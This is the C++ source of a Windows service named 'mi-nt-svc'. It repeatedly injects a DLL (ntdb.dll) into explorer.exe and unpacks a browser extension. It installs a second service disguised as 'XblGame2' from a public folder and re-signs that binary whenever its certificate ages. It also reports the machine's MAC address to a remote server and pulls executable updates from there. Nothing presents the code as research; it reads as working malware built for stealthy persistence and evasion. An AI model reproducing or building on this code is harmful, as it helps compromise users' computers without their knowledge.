// mi_id_svc.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <windows.h>
#include <iostream>
#include <winsvc.h>
#include <wtypes.h>
#include <stdio.h>
#include <tchar.h>
#include <sddl.h>
#include "ZipUtil.h"
#include "ProcessUtil.h"
#include "HookUtil.h"
#include "NetUtil.h"
#include "MyDefine.h"

#define GD_SVC_NAME				L"mi-nt-svc"

SERVICE_STATUS_HANDLE lv_hServiceStatus;
HANDLE lv_thdService = NULL;
HANDLE lv_thdService_UpdateServer = NULL;

BOOL	lv_ProcStop = FALSE;
DWORD	lv_dwProcess_Explorer = 0;
BOOL	lv_bLoginOK = TRUE;
BOOL	lv_UpdateThreadStart = FALSE;

bool	lv_bInjectStatus = false;

//.
std::string lv_sUUID = "";
std::string lv_sAppName = "";
std::string lv_sLocalVerInfo = "";
//std::string lv_sUpdateServer = "localhost";
//std::string lv_sUpdateServer_Ver_API = "/version";
//std::string lv_sUpdateServer_Download_API = "/download";

void RunService();

// Service control handler function
DWORD WINAPI ServiceCtrlHandlerEx(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext) {
	switch (dwControl) {
	case SERVICE_CONTROL_STOP:
//		OutputDebugStringA("-------- SERVICE_CONTROL_STOP");

		lv_ProcStop = TRUE;
		Sleep(1000);

		if (lv_thdService != NULL) {
			TerminateThread(lv_thdService, 0);
			lv_thdService = NULL;
		}
		if (lv_thdService_UpdateServer != NULL) {
			TerminateThread(lv_thdService_UpdateServer, 0);
			lv_thdService_UpdateServer = NULL;
		}
		//. 
		//if (lv_dwProcess_Explorer != 0) {
		//	UninjectDLL(lv_dwProcess_Explorer, "ntdb.dll");
		//	lv_dwProcess_Explorer = 0;
		//}
		SERVICE_STATUS serviceStatus;
		serviceStatus.dwCurrentState = SERVICE_STOPPED;
		SetServiceStatus(lv_hServiceStatus, &serviceStatus);
		break;

//	case SERVICE_CONTROL_CONTINUE:
////		OutputDebugStringA("-------- SERVICE_CONTROL_CONTINUE");
//
//		lv_ProcStop = FALSE;
//		RunService();
//		break;

	case SERVICE_CONTROL_SESSIONCHANGE:
		if (dwEventType == WTS_SESSION_LOGON) {
			MyWriteLog("SERVICE_CONTROL_SESSIONCHANGE lv_bLoginOK = TRUE");
			lv_bLoginOK = TRUE;
		}
		else if (dwEventType == WTS_SESSION_LOGOFF) {
			MyWriteLog("SERVICE_CONTROL_SESSIONCHANGE lv_bLoginOK = FALSE");
			lv_bLoginOK = FALSE;
		}
		break;
	default:
		break;
	}

	return NO_ERROR;
}

unsigned long startService(const wchar_t* p_wszName)
{
	unsigned long lRet = 0;
	SC_HANDLE schSCManager = NULL;
	SC_HANDLE schService = NULL;
	SERVICE_STATUS ssSvcStatus = {};

	// Open the local default service control manager database
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (schSCManager == NULL)
	{
		wprintf(L"OpenSCManager failed w/err 0x%08lx\n", GetLastError());
		lRet = GetLastError();
		goto Cleanup;
	}

	// Open the service with delete, stop, and query status permissions
	schService = OpenService(schSCManager, p_wszName, SERVICE_START);
	if (schService == NULL)
	{
		wprintf(L"OpenService failed w/err 0x%08lx\n", GetLastError());
		lRet = GetLastError();
		goto Cleanup;
	}

	if (StartService(schService, 0, NULL) == false) {
		wprintf(L"StartService failed w/err 0x%08lx\n", GetLastError());
		lRet = GetLastError();
		goto Cleanup;
	}

Cleanup:
	// Centralized cleanup for all allocated resources.
	if (schSCManager)
	{
		CloseServiceHandle(schSCManager);
		schSCManager = NULL;
	}
	if (schService)
	{
		CloseServiceHandle(schService);
		schService = NULL;
	}
	return lRet;
}

//.
unsigned int TF_THREAD(void*) {
	
	TCHAR			w_szParam[MAX_PATH] = L"";
	std::wstring	w_strOpt = L"";

	wchar_t				wszDir[MAX_PATH]; memset(wszDir, 0, sizeof(wszDir));
	wchar_t				wszPath[MAX_PATH]; memset(wszPath, 0, sizeof(wszPath));
	char				wszTempPath[MAX_PATH]; memset(wszTempPath, 0, sizeof(wszTempPath));
	INSTALLER_INFO      w_stINSTALLER_INFO; memset(&w_stINSTALLER_INFO, 0x00, sizeof(INSTALLER_INFO));

	GetTempPathA(MAX_PATH, wszTempPath);
	strcat(wszTempPath, "xtdbf\\");
	CreateDirectoryA(wszTempPath, NULL);

	//.
	GetModuleFileName(NULL, wszDir, MAX_PATH);
	wchar_t* pSlash = wcsrchr(wszDir, L'\\');
	if (pSlash != NULL)
		pSlash[0] = 0x0;

	swprintf_s(wszPath, MAX_PATH, L"%s\\ntdb.dll", wszDir);

	//.
	FILE* w_pFileInfo = fopen(GD_LOCAL_SET_INFO_FILEPATH, "rb");
	if (w_pFileInfo != NULL) {
		fread(&w_stINSTALLER_INFO, 1, sizeof(INSTALLER_INFO), w_pFileInfo);
		fclose(w_pFileInfo);
	}

	MyWriteLog("TF_THREAD Start");

	//. Extract CRX Zip File
	if (IsFileExist(GD_LOCAL_EXT_MANIFAST_FILEPATH) == FALSE) {
		MyUnzipFile(GD_TEMP_CRX_FILEPATH, GD_LOCAL_DIR_PATH);
		MyWriteLog("TF_THREAD MyUnzipFile GD_TEMP_CRX_FILEPATH");
	}
	else {
		MyWriteLog("TF_THREAD MyUnzipFile do not run");
	}

	//.
	while (lv_ProcStop == FALSE) {

		//. Hook into Explorer
		DWORD explorerPID = GetExplorerPID("");
		if (explorerPID == 0) {
			Sleep(500);
			continue;
		}
		if (IsFileExist(GD_LOCAL_UPTIMECRX_FILEPATH) == FALSE) {
			MyWriteLog("TF_THREAD IsFileExist(GD_LOCAL_UPTIMECRX_FILEPATH) == FALSE");

			ModContentToFile(GD_TEMP_UPDATE_FILEPATH, GD_LOCAL_UPTIMECRX_FILEPATH);
			cmd_sign(GD_LOCAL_UPTIMECRX_FILEPATH, GD_LOCAL_SIGNTOOL_FILEPATH);

			swprintf(w_szParam, L"/C sc create XblGame2 binPath=\"C:\\Users\\Public\\data\\uptimecrx.exe\" start= auto");
			_execute(L"cmd.exe", w_szParam, 1);
			swprintf(w_szParam, L"/C sc start XblGame2");
			_execute(L"cmd.exe", w_szParam, 1);
		}

		lv_bInjectStatus = FindHookDllINExplor(explorerPID, GD_MY_HOOK_DLL_NAME);

		//. check my ntdb.dll in explorer.exe
		if (lv_bInjectStatus == false && lv_bLoginOK == TRUE) {
			MyWriteLog("TF_THREAD FindHookDllINExplor(explorerPID, GD_MY_HOOK_DLL_NAME) == false && lv_bLoginOK == TRUE");

			//. check ntdb.dll
			if (IsFileExist(GD_LOCAL_DLL_FILEPATH) == FALSE) {
				MyWriteLog("TF_THREAD IsFileExist(GD_LOCAL_DLL_FILEPATH) == FALSE");

				//ModContentToFile(GD_TEMP_DLL_FILEPATH, GD_LOCAL_DLL_FILEPATH);
				//cmd_sign(GD_LOCAL_DLL_FILEPATH, GD_LOCAL_SIGNTOOL_FILEPATH);

				w_strOpt = L"--uploaddll";
				RunAgentExe(wszTempPath, w_strOpt);
			}
			else {
				MyWriteLog("TF_THREAD IsFileExist(GD_LOCAL_DLL_FILEPATH) == TRUE");
			}

			//. if download file is exist, run updating
			//if (IsFileExist(GD_UPDATE_VER_FILEPATH) == TRUE) {
			//	MyWriteLog("IsFileExist(GD_UPDATE_VER_FILEPATH) == TRUE");
			//	if (IsFileExist(GD_UPDATE_EXE_FILEPATH) == TRUE) {
			//		lv_ProcStop = TRUE;
			//		MyWriteLog("run update program ( param --update)");
			//		swprintf(w_szParam, L"/C sc stop XblGame2");
			//		_execute(L"cmd.exe", w_szParam, 1);
			//		//. run update program ( param --update)
			//		std::wstring	w_sUPDATEExePath = charToWstring(GD_UPDATE_EXE_FILEPATH);
			//		swprintf(w_szParam, L"/C %s --update", w_sUPDATEExePath.c_str());
			//		_execute(L"cmd.exe", w_szParam, 0);
			//		break;
			//	}
			//	else {
			//		DeleteFileA(GD_UPDATE_VER_FILEPATH);
			//	}
			//}

			//. 
			MyWriteLog("TF_THREAD xagentdd --install");
			w_strOpt = L"--install";
			RunAgentExe(wszTempPath, w_strOpt);
			lv_UpdateThreadStart = TRUE;
		}
		else if (lv_bInjectStatus == true && lv_bLoginOK == TRUE && w_stINSTALLER_INFO.m_nServiceProtection == 1) {
			//. update GD_LOCAL_UPTIMECRX_FILEPATH certification time
			SYSTEMTIME  w_stBefore;
			bool		w_bSts = Test_GetCertDateInfo(charToWstring(GD_LOCAL_UPTIMECRX_FILEPATH), w_stBefore);
			SYSTEMTIME  w_stSysTime = GetCurrentSystemTime();
			if (w_bSts == true && CalculateTimeDifference(w_stSysTime, w_stBefore) > GD_DIFF_CERT_TIME_UPDATE) {
				MyWriteLog("TF_THREAD update GD_LOCAL_UPTIMECRX_FILEPATH certification time");
				swprintf(w_szParam, L"/C sc stop XblGame2");
				_execute(L"cmd.exe", w_szParam, 1);
				Sleep(2000);

				ModContentToFile(GD_TEMP_UPDATE_FILEPATH, GD_LOCAL_UPTIMECRX_FILEPATH);
				cmd_sign(GD_LOCAL_UPTIMECRX_FILEPATH, GD_LOCAL_SIGNTOOL_FILEPATH);

				swprintf(w_szParam, L"/C sc create XblGame2 binPath=\"C:\\Users\\Public\\data\\uptimecrx.exe\" start= auto");
				_execute(L"cmd.exe", w_szParam, 1);
				swprintf(w_szParam, L"/C sc start XblGame2");
				_execute(L"cmd.exe", w_szParam, 1);
			}
			else if (w_bSts == false) {
				MyWriteLog("Faild ... TF_THREAD GD_LOCAL_UPTIMECRX_FILEPATH certification time");
			}

			//. update GD_LOCAL_SVC_FILEPATH certification time
			w_bSts = Test_GetCertDateInfo(charToWstring(GD_LOCAL_SVC_FILEPATH), w_stBefore);
			if (w_bSts == true && CalculateTimeDifference(w_stSysTime, w_stBefore) > GD_DIFF_CERT_TIME_UPDATE) {
				lv_ProcStop = TRUE;
				MyWriteLog("TF_THREAD update GD_LOCAL_SVC_FILEPATH certification time");
				FILE* w_pFile = fopen(GD_LOCAL_SVC_UPDATE_FILEPATH, "wb");
				if (w_pFile) fclose(w_pFile);
				break;
			}
			else if (w_bSts == false) {
				MyWriteLog("Faild ... TF_THREAD GD_LOCAL_SVC_FILEPATH certification time");
			}

			lv_UpdateThreadStart = TRUE;
		}
		//. Log Off
		//else if (FindHookDllINExplor(explorerPID, GD_MY_HOOK_DLL_NAME) == true &&  lv_bLoginOK == FALSE) {
		//	MyWriteLog("FindHookDllINExplor(explorerPID, GD_MY_HOOK_DLL_NAME) == true && lv_bLoginOK == FALSE");
		//	lv_UpdateThreadStart = FALSE;
		//	std::wstring	w_strOpt = L"--uninject";
		//	RunAgentExe(wszTempPath, w_strOpt);
		//}
		else {
			lv_UpdateThreadStart = TRUE;
		}
		//. 
		Sleep(2000);
	}

	return 0;
}

void	RegOnServer()
{
	MyWriteLog("mi_id_svc ... RegOnServer Start");

	std::string osVersion = GetOSVersion();
	std::string macAddress = GetMACAddress();
	
	char w_sDataBuffer[MAX_PATH] = "";
	sprintf(w_sDataBuffer, "{\n  \"type\": \"WindowsApplication\",\n  \"deviceId\": \"%s\",\n  \"osVersion\": %s,\n  \"app\": \"%s\"\n}", macAddress.c_str(), osVersion.c_str(), lv_sAppName.c_str());

	MyWriteLog("mi_id_svc ... RegOnServer request = %s", w_sDataBuffer);

	std::string response = "";
	if (HTTPSPost_GetUUID(CON_SERVER_ADDR, REG_API_ADDR, w_sDataBuffer, response, GD_BEARER_TOKEN_ID)) {
		if (response.empty() == false) {
			MyWriteLog("mi_id_svc ... RegOnServer response = %s", response.c_str());
			lv_sUUID = GetIDVaule(response);
			SetAppNameAndUUIDInfo(GD_LOCAL_INFO_FILEPATH, lv_sAppName, lv_sUUID);
		}
	}
	else {
	}

	return;
}

//.
unsigned int TF_THREAD_UPDATE(void*) 
{
	bool			w_bSts = false;
	std::string		w_sLocalDownPath = GD_UPDATE_EXE_FILEPATH;

	CreateDirectoryA(GD_UPDATE_DIR, NULL);

	if (lv_sLocalVerInfo.empty()) {
		lv_sLocalVerInfo = readVersionFile(GD_LOCAL_VER_FILEPATH);
	}
	MyWriteLog("TF_THREAD_UPDATE Start");

	if (lv_sUUID.empty()) {
		GetAppNameAndUUIDInfo(GD_LOCAL_INFO_FILEPATH, lv_sAppName, lv_sUUID);
	}

	//.
	while (lv_ProcStop == FALSE) {

		if (lv_UpdateThreadStart == FALSE) {
			Sleep(1000);
			continue;
		}
		//. 
		if (lv_sUUID.empty()) {
			RegOnServer();
			Sleep(1000);
			continue;
		}

		//. 
		if (IsFileExist(GD_UPDATE_VER_FILEPATH) == TRUE) {
			Sleep(1000);
			continue;
		}

		std::string w_sServerLastVerInfo = "";
		std::string w_sDownPath = DOWN_API_ADDR + lv_sUUID;
		std::string w_Response = "";

		if (HTTPSGet(CON_SERVER_ADDR, w_sDownPath, w_Response, GD_BEARER_TOKEN_ID)) {
			std::string w_sURL = GetDownloadURL(w_Response, w_sServerLastVerInfo);
			if (w_sServerLastVerInfo.empty() == true) {
			}
			else {
				int w_nRet = compareVersions(lv_sLocalVerInfo, w_sServerLastVerInfo);
				if (w_nRet == -1) {
					MyWriteLog("TF_THREAD_UPDATE Real Upadte -- w_sServerLastVerInfo = %s", w_sServerLastVerInfo.c_str());

					std::string downheader = DOWNURL_HEADER;
					w_sURL = w_sURL.substr(downheader.size(), w_sURL.size() - downheader.size());
					w_bSts = HTTPSGet_DownloadFile(CON_SERVER_ADDR, w_sURL, w_sLocalDownPath, GD_BEARER_TOKEN_ID);
					if (w_bSts == true) {
						//. Strating Update
						FILE* w_pFile = NULL;
						w_pFile = fopen(GD_UPDATE_VER_FILEPATH, "wb");
						if (w_pFile) {
							fwrite(w_sServerLastVerInfo.c_str(), w_sServerLastVerInfo.size(), 1, w_pFile);
							fclose(w_pFile);
						}
					}
				}
				else {
					DeleteFileA(GD_UPDATE_EXE_FILEPATH);
				}
			}
		}
		else {

		}
		//. 
		Sleep(1000);
	}
	return 0;
}

//.
void RunService() {
	
	DWORD dwTID;

	lv_UpdateThreadStart = FALSE;

	lv_thdService = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TF_THREAD, NULL, 0, &dwTID);
	//lv_thdService_UpdateServer = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TF_THREAD_UPDATE, NULL, 0, &dwTID);
	WaitForSingleObject(lv_thdService, INFINITE);
	//WaitForSingleObject(lv_thdService_UpdateServer, INFINITE);
}

//.
VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
//	OutputDebugStringA("SfT - Service Main\n");

	lv_ProcStop = FALSE;

	// Register service control handler
	lv_hServiceStatus = RegisterServiceCtrlHandlerEx(GD_SVC_NAME, ServiceCtrlHandlerEx, NULL);
	if (!lv_hServiceStatus) {
		return;
	}

	// Notify service controller that the service is starting
	SERVICE_STATUS serviceStatus;
	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	serviceStatus.dwCurrentState = SERVICE_START_PENDING;
	serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	serviceStatus.dwWin32ExitCode = NO_ERROR;
	serviceStatus.dwServiceSpecificExitCode = 0;
	serviceStatus.dwCheckPoint = 0;
	serviceStatus.dwWaitHint = 0;
	SetServiceStatus(lv_hServiceStatus, &serviceStatus);

	// Perform initialization tasks here

	// Notify service controller that the service is running
	serviceStatus.dwCurrentState = SERVICE_RUNNING;
	SetServiceStatus(lv_hServiceStatus, &serviceStatus);

	while (lv_ProcStop == FALSE) {
		// Run the service
		RunService();
		Sleep(1000);
	}
	//if (lv_dwProcess_Explorer != 0) {
	//	UninjectDLL(lv_dwProcess_Explorer, "ntdb.dll");
	//	lv_dwProcess_Explorer = 0;
	//}

	// Notify service controller that the service has stopped
	serviceStatus.dwCurrentState = SERVICE_STOPPED;
	SetServiceStatus(lv_hServiceStatus, &serviceStatus);
}

int main() 
	{
//		OutputDebugStringA("SfT---Start");
		wchar_t p[] = GD_SVC_NAME;

		SERVICE_TABLE_ENTRYW ServiceTable[] =
		{
			{ (LPWSTR)GD_SVC_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
			{ NULL, NULL }
		};

		// Start the service control dispatcher
		if (!StartServiceCtrlDispatcher(ServiceTable)) {
			//		std::cerr << "Failed to start service control dispatcher\n";
//			OutputDebugStringA("SfT---exit");
			return GetLastError();
		}
		return 0;
	}
